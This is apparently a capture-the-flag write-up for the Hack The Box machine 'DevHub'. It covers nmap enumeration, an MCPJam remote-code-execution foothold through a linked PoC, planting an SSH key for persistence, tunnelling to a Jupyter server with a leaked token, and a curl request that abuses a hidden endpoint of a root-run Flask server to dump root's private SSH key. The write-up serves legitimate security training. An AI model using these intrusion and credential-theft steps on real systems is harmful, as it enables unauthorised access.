---
machineName: DevHub
difficulty: Medium
Status: Done
OS: Linux
start_time: 2026-05-30T21:00:00
end_time: 2026-05-30T23:05:00
player_position: "666"
CVEs:
  - "[CVE-2026-23744](https://nvd.nist.gov/vuln/detail/CVE-2026-23744)"
CWEs:
  - "[CWE-306](http://cwe.mitre.org/data/definitions/306.html)"
tools:
  - nmap
  - ffuf
  - wafw00f
  - ZAP
exploited_programs:
  - jupyter
  - MCPJam
open_ports:
  - "22"
  - "80"
  - "8888"
  - "6274"
aliases:
  - Use PoC to get initial foothold -> move laterally with jupyter -> privesc by exploiting conditions on custom "mcp" server run by root
tags:
  - "#HTB"
iconurl: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/8e821c7bbdb90d8520bb597edae70080.png
---
<div style="text-align: center;">
  <img
    src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/8e821c7bbdb90d8520bb597edae70080.png"
    width="200"
  >
</div>

# First Enumeration
```sh
➜  DevHub sudo nmap -sC -sV -p- -T4 10.129.9.31                                                                                                                          [30/05/26 | 9:10:50]
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-30 21:10 +0200
Nmap scan report for devarea.htb (10.129.9.31)
Host is up (0.016s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Sat, 30 May 2026 19:12:42 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Sat, 30 May 2026 19:12:42 GMT
|_    Connection: close

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.57 seconds

```

We see in port 6274 an `MCPJam` server, the same from [[Kobold]] last season.

I whipped out this [CVE-2026-23744 PoC](https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC) without hesitation.

It worked, and  landed a shell as the `mcp-dev` user.
```
pwd 
```
```
/opt/mcpjam/node_modules/@mcpjam/inspector
```
```sh
ls -la
```
```
total 48
drwxr-xr-x 6 root root 4096 Jan 22 18:19 .
drwxr-xr-x 3 root root 4096 Jan 22 18:15 ..
-rw-r--r-- 1 root root  334 Jan 22 18:19 .env.production
-rw-r--r-- 1 root root  973 Jan 22 18:18 LICENSE
-rw-r--r-- 1 root root 7642 Jan 22 18:19 README.md
drwxr-xr-x 2 root root 4096 Jan 22 18:18 assets
drwxr-xr-x 2 root root 4096 Jan 22 18:18 bin
drwxr-xr-x 5 root root 4096 Jan 22 18:18 dist
drwxr-xr-x 3 root root 4096 Jan 22 18:15 node_modules
-rw-r--r-- 1 root root 7154 Jan 22 18:18 package.json
```
```
cat .env.production
VITE_CONVEX_URL=https://outstanding-fennec-304.convex.cloud
CONVEX_URL=https://outstanding-fennec-304.convex.cloud
VITE_WORKOS_CLIENT_ID=client_01K4C1TVPBE7JTBFQJF9SDW9P9
VITE_WORKOS_REDIRECT_URI=mcpjam://oauth/callback
CONVEX_HTTP_URL=https://outstanding-fennec-304.convex.site
ENVIRONMENT=production
VITE_DISABLE_POSTHOG_LOCAL=false
```

After this I understood I was in the `/opt` path of the MCPJam server, I didn’t found anything interesting here after a bit of enumeration, when we see the ~ folder there were some lxd related files, normally lxd is a huge flag for privesc but I didn’t see any rights that would allow me to profit from LXD.

At this point the shell was weirdly dropping rather frequently, so I put my ssh public key in the `~/.ssh/authorized_keys` file of **mcp-dev**, so I could get a decent connection.

As soon as I could, I got linpeass on the victim, and found the following interesting info:
```
╔══════════╣ Running processes (cleaned) (T1057)

manalyst     1074  0.2  2.4 182536 96528 ?        Ss   19:03   0:04 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=12
7.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --
ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
root        1082  0.0  0.7  37376 28648 ?        Ss   19:03   0:00 /home/manalyst/jupyter-env/bin/python3 /opt/opsmcp/server.py

```

```
╔══════════╣ Active Ports (T1049)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat) (T1049)
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:6274            0.0.0.0:*               LISTEN      1276/node
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
══╣ Local-only listeners (loopback) (T1049)
tcp   LISTEN 0      128        127.0.0.1:5000      0.0.0.0:*
tcp   LISTEN 0      128        127.0.0.1:8888      0.0.0.0:*

```

So to summarize:
- There’s another user called `analyst`
- He’s running a jupyter server and his access token is `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`
- `root` is running a weird process `/home/manalyst/jupyter-env/bin/python3 /opt/opsmcp/server.py`
- Jupyter is running on port `8888` (I know this as I use jupyter at university a lot lol (and I hate it (it’s awful)))
- There’s another open port at `5000`



# First Foothold (Lateral Movement)

I verified Jupyter was indeed running and accesible :
```
mcp-dev@devhub:~$ curl "http://127.0.0.1:8888/api/contents?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" 
{"name": "", "path": "", "last_modified": "2026-05-26T08:42:22.462480Z", "created": "2026-05-26T08:42:22.462480Z", "content": [
{"name": "quarterly_analysis.ipynb", "path": "quarterly_analysis.ipynb", "last_modified": "2026-01-22T15:06:49.961594Z", "created": "2026-05-26T08:42:21.153593Z", "content": null, "format": null, "mimetype": null, "size": 556, "writable": true, "hash": null, "hash_algorithm": null, "type": "notebook"}], "format": "json", "mimetype": null, "size": null, "writable": true, "hash": null, "hash_algorithm": null, "type": "directory"}
```

It is and wee see there’s `quarterly_analysis.ipynb`

As I already had an ssh connection on `mcp-dev` I simply tunneled the `8888` port so I can access it from my machine.
```sh
ssh -L 8888:127.0.0.1:8888 mcp-dev@10.129.9.31 
```

So when visiting `http://127.0.0.1:8888` we see the usual jupyter interface, and I did the same thing I did before with `mcp-dev` but with `analyst`.

![[images/htb_images/Pasted image 20260530222758.png]]
# Second Enumeration


Once in `analyst` I re launched linpeass but nothing interesting popped up, after a bit more of manual enumeration I found an interesting access token in ~:
```
analyst@devhub:~$ cat .opsmcp_key 
opsmcp_secret_key_4f5a6b7c8d9e0f1a
```

This made me think to the port `5000`, checking it out we get:
```
analyst@devhub:~$ curl http://127.0.0.1:5000
{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}
```

This in clearly in link with the process ran by root, we can then check the script: 
```sh
cat /opt/opsmcp/server.py
```

```python
 #!/usr/bin/env python3 
 """ OPSMCP - Operations MCP Server Internal tool for system operations management """ 
 from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}


def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY


@app.route('/')
def index():
    return jsonify({
        "server": "OPSMCP",
        "version": "2.1.0",
        "status": "operational",
        "endpoints": ["/tools/list", "/tools/call", "/health"],
        "auth": "Required - X-API-Key header"
    })


@app.route('/health')
def health():
    return jsonify({"status": "healthy", "uptime": "14d 3h 22m"})


@app.route('/tools/list')
def list_tools():
    if not check_auth():
        return jsonify({
            "error": "Unauthorized",
            "message": "Valid X-API-Key header required"
        }), 401

    return jsonify({
        "tools": list(VISIBLE_TOOLS.keys()),
        "count": len(VISIBLE_TOOLS),
        "details": VISIBLE_TOOLS
    })


@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({
            "error": "Unauthorized",
            "message": "Valid X-API-Key header required"
        }), 401

    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})

    if not tool_name:
        return jsonify({"error": "Tool name required"}), 400

    if tool_name not in ALL_TOOLS:
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404

    # Execute tool
	
	#<SNIP>


    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)

        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })

        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })

       else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })

    return jsonify({"error": "Tool execution failed"}), 500


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False) 

```



# Privilege Escalation

After analysis we see that the script has a hidden `_debug_mode` and mainly a `_admin_dump`, after playing around with many requests, I ended up dumping the root ssh key with:

```sh
curl -X POST http://127.0.0.1:5000/tools/call   -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"   -H "Content-Type: application/json"   -d '{
    "name": "ops._admin_dump",
    "arguments": {
      "target": "ssh_keys",
      "confirm": true
    }
  }'
```
```
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```

I put this in a file, opened with nvim typed `:%s/\\n/\r/g` to replace all broken line breaks, then `chmod 600 root_key` and connected with `ssh root@<IP> -i root_key`

On hindsight it might have been easier to actually enumerate manually, and don’t loose time with all the `linpeass` scans!

![[images/htb_images/Pasted image 20260531003634.png]]